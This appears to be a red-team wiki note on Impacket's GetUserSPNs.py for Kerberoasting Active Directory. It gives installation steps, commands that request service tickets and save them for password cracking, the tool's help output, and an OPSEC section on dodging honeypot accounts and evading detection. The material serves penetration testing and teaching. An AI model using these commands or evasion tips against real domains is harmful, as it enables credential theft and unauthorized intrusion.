---
aliases:
  - impacket-GetUserSPNs
tags:
  - ⛏️
  - T1558003
primary categories:
  - "[[01 - Red Team]]"
  - "[[01 - Penetration Test]]"
secondary categories:
  - "[[02 - Active Directory]]"
  - "[[02 - Credential Harvesting]]"
  - "[[02 - Kerberoasting]]"
  - "[[02 - Post-Exploitation]]"
type: Tool
---
# [[GetUserSPNs.py]]

***
## Overview

[`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) is a tool from the [Impacket](https://github.com/fortra/impacket) [Python](https://www.python.org/) module collection that automates [kerberoasting](https://attack.mitre.org/techniques/T1558/003/) attacks against user accounts associated with [service principal names (SPNs)](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) in [Active Directory (AD)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)[^1][^2]. If the service account password used to encrypt the returned [ticket-granting service (TGS)](https://csrc.nist.gov/glossary/term/tgs) ticket is weak, an attacker can recover its plaintext password by cracking the TGS hash output from `GetUserSPNs.py`.

## Requirements

* [ ] Attacker is on a \*nix-like machine with access to the target AD network
* [ ] Attacker has valid AD credentials
* [ ] Target user(s) are vulnerable to kerberoasting
	* [ ] Target user object(s) have a non-null  `servicePrincipalName` attribute

## Installation/Compilation

Before installing `GetUserSPNs.py`, ensure Python is installed:
```
# Debian/Ubuntu
sudo apt install python3

# Fedora
sudo dnf install python3
```

The easiest way to install `GetUserSPNs.py` is by installing the Impacket library via `pip`:
```
pip install impacket
```

Alternatively, clone the Impacket repository and install it locally:
```
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

On [Kali Linux](https://www.kali.org/), you can install the [impacket-scripts](https://www.kali.org/tools/impacket-scripts/) package. This makes the tools accessible in your `$PATH`, prefixed with `impacket-`:
```
sudo apt install impacket-scripts

impacket-GetUserSPNs -h
```

## Usage

Kerberoast all vulnerable users in a domain (you will be prompted for a password):
```
GetUserSPNs.py -request -dc-ip <dc-ipv4-address> <domain.full>/<user>
```

Kerberoast all vulnerable users and dump the output to a file:
```
GetUserSPNs.py -request -dc-ip <dc-ipv4-address> -outputfile <filename> <domain.full>/<user>
```

After retrieving a TGS ticket, you can attempt to crack the service account password using [Hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/).

## Operational Security (OPSEC)

Requesting TGS tickets for every SPN in a domain will likely raise alerts, especially if one or more SPNs are positioned as [honeypots](https://csrc.nist.gov/glossary/term/honeypot), accounts intentionally configured to detect kerberoasting attempts[^3]. These honeypot SPNs often appear legitimate but are closely monitored.

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password:
ServicePrincipalName          Name         MemberOf  PasswordLastSet            LastLogon  Delegation
----------------------------  -----------  --------  -------------------------  ---------  ---------
MSSQLSvc/sql.domain.com:1433  mssql_svc              XXXX-XX-XX XX:XX:XX.XXXXX  <never>
HoneySvc/fake.domain.com      honey_svc              XXXX-XX-XX XX:XX:XX.XXXXX  <never>
```

If possible, ensure the requesting account appears plausible to a defender. For example, a sales employee requesting a TGS for a [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server) service is suspicious; using an IT or data steward account would appear more legitimate.

Additionally, avoid requesting all SPNs in bulk. Multiple SPN requests in a short window will appear as anomalous on a defender's radar, possibly leading to detection[^4]. Instead, identify individual accounts vulnerable to kerberoasting using [BloodHound](https://github.com/SpecterOps/BloodHound) or a similar tool, then request TGS tickets for a single target:
```
GetUserSPNs.py -request-user <target-user> -dc-ip <dc-ipv4-address> -outputfile <filename> <domain.full>/<user>
```

TODO: Add discussion about encryption types, the `(servicePrincipalName=*)` LDAP query, and ticket request parameters.

## Under-the-Hood

TODO: Inspect `GetUserSPNs.py` source code, analyze ticket exchanges in [Wireshark](https://www.wireshark.org/), and document detailed function flow.

## Help Menu

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-no-preauth NO_PREAUTH] [-stealth] [-usersfile USERSFILE] [-request] [-request-user username] [-save] [-outputfile OUTPUTFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain[/username[:password]]

options:
  -h, --help            show this help message and exit
  -target-domain TARGET_DOMAIN
                        Domain to query/request if different than the domain of the user. Allows for Kerberoasting across trusts.
  -no-preauth NO_PREAUTH
                        account that does not require preauth, to obtain Service Ticket through the AS
  -stealth              Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. May cause huge memory consumption / errors on large domains.
  -usersfile USERSFILE  File with user per line to test
  -request              Requests TGS for users and output them in JtR/hashcat format (default False)
  -request-user username
                        Requests TGS for the SPN associated to the user specified (just the username, no domain needed)
  -save                 Saves TGS requested to disk. Format is <username>.ccache. Auto selects -request
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format. Auto selects -request
  -ts                   Adds timestamp to every logging output.
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter. Ignoredif -target-domain is specified.
  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
```

***
## Resources:

| Hyperlink                                                                                        | Info                                                   |
| ------------------------------------------------------------------------------------------------ | ------------------------------------------------------ |
| [GitHub - Impacket](https://github.com/fortra/impacket)                                          | GitHub repository for Impacket Python class collection |
| [Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) | MITRE ATT&CK entry for "Kerberoasting"                 |

[^1]: https://youtu.be/PUyhlN-E5MU
[^2]: https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
[^3]: https://adsecurity.org/?p=3513
[^4]: https://research.splunk.com/endpoint/eb3e6702-8936-11ec-98fe-acde48001122/

***

*Created Date*: <%+tp.file.creation_date("MMMM Do YYYY (HH:mm a)")%>  
*Last Modified Date*: <%+tp.file.last_modified_date("MMMM Do YYYY (HH:mm a)")%>
